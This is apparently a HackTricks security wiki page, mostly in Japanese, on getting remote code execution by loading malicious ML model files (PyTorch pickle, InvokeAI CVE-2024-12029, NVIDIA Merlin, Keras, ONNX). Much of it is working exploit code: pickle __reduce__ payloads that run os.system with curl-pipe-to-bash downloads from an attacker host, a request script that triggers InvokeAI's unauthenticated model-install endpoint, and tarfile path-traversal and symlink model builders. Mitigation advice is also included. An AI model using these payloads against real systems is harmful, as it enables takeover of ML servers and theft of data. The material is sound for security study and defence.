# モデル RCE

{{#include ../banners/hacktricks-training.md}}

## モデルをRCEにロードする

Machine Learning modelsは通常、ONNX、TensorFlow、PyTorchなどのさまざまな形式で共有されます。これらのモデルは開発者のマシンやプロダクションシステムにロードして使用されます。通常、モデル自体に悪意のあるコードは含まれていないはずですが、モデルが任意のコードをシステム上で実行するために使われるケースがあり、意図された機能として、あるいはモデル読み込みライブラリの脆弱性のために発生します。

執筆時点で、このタイプの脆弱性の例は次のとおりです。

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | モデルチェックポイントに仕込まれた悪意のある pickle によりコード実行（`weights_only` 保護を回避）                                            | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + 悪意のあるモデルダウンロードがコード実行を引き起こす；管理APIでの Java deserialization RCE                                        | |
| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                                           | 信頼されていないチェックポイントが `load_model_trainer_states_from_checkpoint` 中に pickle reducer をトリガー → ML worker でコード実行 | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | YAML からモデルを読み込む際に `yaml.unsafe_load` を使用（コード実行） <br> Lambda レイヤーを含むモデル読み込みで任意の Python コードが実行される | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | 細工された `.tflite` モデルが整数オーバーフローを誘発 → ヒープ破壊（潜在的な RCE）                                                         | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | `joblib.load` 経由でモデルを読み込むと、攻撃者の `__reduce__` ペイロードを含む pickle が実行される                                           | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load` のデフォルトがピクル化されたオブジェクト配列を許可するため、悪意のある `.npy/.npz` がコード実行を引き起こす                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX モデルの external-weights パスがディレクトリを脱出して任意ファイルを読み取れる <br> 悪意のある ONNX モデル tar が任意ファイルを上書き（RCE に繋がる） | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | カスタムオペレータを含むモデルは攻撃者のネイティブコードのロードを要求する可能性がある；複雑なモデルグラフが意図しない計算を悪用することがある           | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | `--model-control` 有効時に model-load API を使用すると相対パスのトラバーサルでファイルを書き込める（例：`.bashrc` を上書きして RCE）            | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | 異常な GGUF モデルファイルがパーサのヒープバッファオーバーフローを引き起こし、被害者システム上で任意のコード実行を可能にする                        | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | 悪意のある HDF5 (`.h5`) モデルに Lambda レイヤーのコードが含まれているとロード時に実行される（Keras safe_mode は古いフォーマットをカバーしない ― 「ダウングレード攻撃」） | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | 多くの ML ツール（pickle ベースのモデル形式、Python の `pickle.load` など）は、適切に緩和されていない限りモデルファイルに埋め込まれた任意コードを実行する可能性がある | |

さらに、[PyTorch](https://github.com/pytorch/pytorch/security) のように python pickle ベースのモデルは、`weights_only=True` でロードされない場合にシステム上で任意のコードを実行するために使われる可能性があります。したがって、上の表に記載がない場合でも、pickle ベースのモデルはこの種の攻撃に特に脆弱であると考えるべきです。

### 🆕  InvokeAI の `torch.load` 経由 RCE (CVE-2024-12029)

`InvokeAI` は Stable-Diffusion 向けの人気のあるオープンソースの web インターフェースです。バージョン **5.3.1 – 5.4.2** は任意の URL からモデルをダウンロードしてロードできる REST エンドポイント `/api/v2/models/install` を公開しています。

内部的には、そのエンドポイントは最終的に次を呼び出します：
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
When the supplied file is a **PyTorch checkpoint (`*.ckpt`)**, `torch.load` performs a **pickle deserialization**.  Because the content comes directly from the user-controlled URL, an attacker can embed a malicious object with a custom `__reduce__` method inside the checkpoint; the method is executed **during deserialization**, leading to **remote code execution (RCE)** on the InvokeAI server.

この脆弱性は **CVE-2024-12029**（CVSS 9.8、EPSS 61.17 %）として割り当てられました。

#### エクスプロイトの手順

1. 悪意のある checkpoint を作成する:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. あなたが管理するHTTP server上に`payload.ckpt`をホストする（例: `http://ATTACKER/payload.ckpt`）。
3. 脆弱なendpointをトリガーする (no authentication required):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. InvokeAIがファイルをダウンロードすると`torch.load()`が呼び出され → `os.system`ガジェットが実行され、攻撃者はInvokeAIプロセスのコンテキストでコード実行を得る。

Ready-made exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` はこの一連の流れを自動化する。

#### 条件

•  InvokeAI 5.3.1-5.4.2（scan フラグのデフォルトは **false**）  
•  攻撃者が `/api/v2/models/install` にアクセス可能であること  
•  プロセスがシェルコマンドを実行できる権限を持っていること

#### 緩和策

* **InvokeAI ≥ 5.4.3** にアップグレードする — パッチで `scan=True` がデフォルトになり、デシリアライズ前にマルウェアスキャンを実行する。  
* チェックポイントをプログラムでロードする際は `torch.load(file, weights_only=True)` を使うか、新しい [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) ヘルパーを使用する。  
* モデルのソースに対して allow-list / 署名を強制し、サービスは最小権限で実行する。

> ⚠️ **任意の** Python の pickle ベースのフォーマット（多くの `.pt`, `.pkl`, `.ckpt`, `.pth` ファイルを含む）は、信頼できないソースからデシリアライズするのは本質的に安全ではないことを忘れないでください。

---

古い InvokeAI バージョンを reverse proxy の背後で稼働させ続ける必要がある場合の暫定的な緩和策の例：
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec の安全でない `torch.load` を介した RCE (CVE-2025-23298)

NVIDIA の Transformers4Rec（Merlin の一部）は、ユーザー提供のパスに対して直接 `torch.load()` を呼び出す安全でないチェックポイントローダーを公開していました。`torch.load` は Python の `pickle` に依存しているため、攻撃者が制御するチェックポイントは、デシリアライズ中の reducer を介して任意のコードを実行できます。

脆弱なパス（修正前）： `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`。

なぜこれが RCE につながるのか：Python の pickle では、オブジェクトが reducer（`__reduce__`/`__setstate__`）を定義して、呼び出し可能なオブジェクトと引数を返すことができます。アンピクル化時にその呼び出し可能なオブジェクトが実行されます。そのようなオブジェクトがチェックポイントに含まれていると、重みが使用される前に実行されます。

最小限の悪意あるチェックポイントの例：
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Delivery vectors and blast radius:
- Trojanized checkpoints/models shared via repos, buckets, or artifact registries
- Automated resume/deploy pipelines that auto-load checkpoints
- Execution happens inside training/inference workers, often with elevated privileges (e.g., root in containers)

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) replaced the direct `torch.load()` with a restricted, allow-listed deserializer implemented in `transformers4rec/utils/serialization.py`. The new loader validates types/fields and prevents arbitrary callables from being invoked during load.

PyTorch checkpoints に特化した防御ガイダンス:
- 信頼できないデータを unpickle しないでください。可能な場合は [Safetensors](https://huggingface.co/docs/safetensors/index) や ONNX のような非実行形式を優先してください。
- どうしても PyTorch serialization を使う必要がある場合は、`weights_only=True`（新しい PyTorch でサポート）を指定するか、Transformers4Rec パッチと同様のカスタム allow-listed unpickler を使用してください。
- model provenance/署名を強制し、サンドボックス化したデシリアライズを行ってください（seccomp/AppArmor；non-root user；制限された FS とネットワークの出口なし）。
- チェックポイント読み込み時に ML サービスからの予期しない子プロセスを監視し、`torch.load()`/`pickle` の使用を追跡してください。

POC and vulnerable/patch references:
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Example – crafting a malicious PyTorch model

- Create the model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- モデルを読み込む:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent の FaceDetection-DSFD は、ユーザー制御のデータを deserializes する `resnet` endpoint を公開しています。ZDI は、リモートの攻撃者が被害者に悪意のあるページ/ファイルを読み込ませ、そこから細工した serialized blob をその endpoint に push させ、`root` として deserialization を引き起こし、完全な乗っ取りにつながることを確認しました。

この exploit のフローは典型的な pickle abuse を反映しています:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Any gadget reachable during deserialization (constructors, `__setstate__`, framework callbacks, etc.) can be weaponized the same way, regardless of whether the transport was HTTP, WebSocket, or a file dropped into a watched directory.

## モデルによるパストラバーサル

As commented in [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), most models formats used by different AI frameworks are based on archives, usually `.zip`. Therefore, it might be possible to abuse these formats to perform path traversal attacks, allowing to read arbitrary files from the system where the model is loaded.

For example, with the following code you can create a model that will create a file in the `/tmp` directory when loaded:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
または、次のコードを使用して、ロード時に `/tmp` ディレクトリへの symlink を作成するモデルを作成できます:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### 詳細解説: Keras .keras deserialization and gadget hunting

.keras internals、Lambda-layer RCE、≤ 3.8 における arbitrary import issue、および allowlist 内での post-fix gadget discovery に関する集中的なガイドは、次を参照してください:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## 参考資料

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)

{{#include ../banners/hacktricks-training.md}}
